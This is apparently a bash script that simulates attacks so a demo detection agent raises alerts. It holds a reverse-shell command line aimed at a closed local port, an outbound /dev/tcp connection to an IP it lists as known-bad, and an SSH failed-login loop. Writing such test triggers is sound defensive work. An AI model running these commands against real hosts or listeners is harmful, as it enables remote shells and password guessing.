#!/usr/bin/env bash
# Safe, self-contained "attack" actions for the invigilator demo.
#
# Each of these triggers one of detection-agent/rules.py's rules WITHOUT
# doing anything actually destructive to the machine -- they just produce
# the exact behavior pattern the watcher looks for. Run detection-agent's
# watcher.py FIRST, then run one of these, then watch GET /alerts (or the
# dashboard) for a new alert to appear within a few seconds.
#
# Usage: ./simulate_attack.sh <scenario>
#   ./simulate_attack.sh process     -> suspicious process spawn
#   ./simulate_attack.sh network     -> connection to a known-bad IP
#   ./simulate_attack.sh bruteforce  -> instructions (needs a real SSH attempt)

set -euo pipefail
scenario="${1:-}"

case "$scenario" in
  process)
    echo "[simulate] Spawning a reverse-shell-pattern command (harmless -- times out immediately)..."
    # Matches rules.py's "/dev/tcp/" pattern. Connects to a closed local
    # port so it fails instantly and does nothing -- the point is the
    # COMMAND LINE pattern, not an actual working reverse shell.
    timeout 1 bash -c '(bash -i > /dev/tcp/127.0.0.1/4444 0>&1) 2>/dev/null' || true
    echo "[simulate] Done. Check the watcher's terminal / GET /alerts for a new 'Endpoint' alert."
    ;;

  network)
    echo "[simulate] Connecting outbound to a known-bad demo IP (from rules.py's KNOWN_BAD_IPS)..."
    # This will likely fail to actually connect (that's fine/expected) --
    # rules.py's check_bad_ip_connections() rule watches for the connection
    # ATTEMPT via psutil, not a successful handshake.
    timeout 2 bash -c 'exec 3<>/dev/tcp/45.155.205.233/443' 2>/dev/null || true
    echo "[simulate] Done. Check the watcher's terminal / GET /alerts for a new 'Network' alert."
    ;;

  bruteforce)
    cat <<'EOF'
[simulate] Brute-force needs real failed SSH attempts against this machine's
own sshd so they land in /var/log/auth.log or /var/log/secure. From ANOTHER
terminal (or ask your guide to do this from their machine), run:

    for i in 1 2 3 4 5; do
      ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes \
          nonexistent-user@<this-machine-ip> exit
      # enter any wrong password each time, or let it fail on missing user
    done

After ~4-5 failed attempts within 60 seconds, the watcher's brute-force
rule fires automatically. If SSH isn't running on the demo machine, this
scenario isn't runnable here -- use "process" or "network" instead, or
mention in the demo that this rule needs a machine with sshd active.
EOF
    ;;

  *)
    echo "Usage: $0 {process|network|bruteforce}"
    exit 1
    ;;
esac
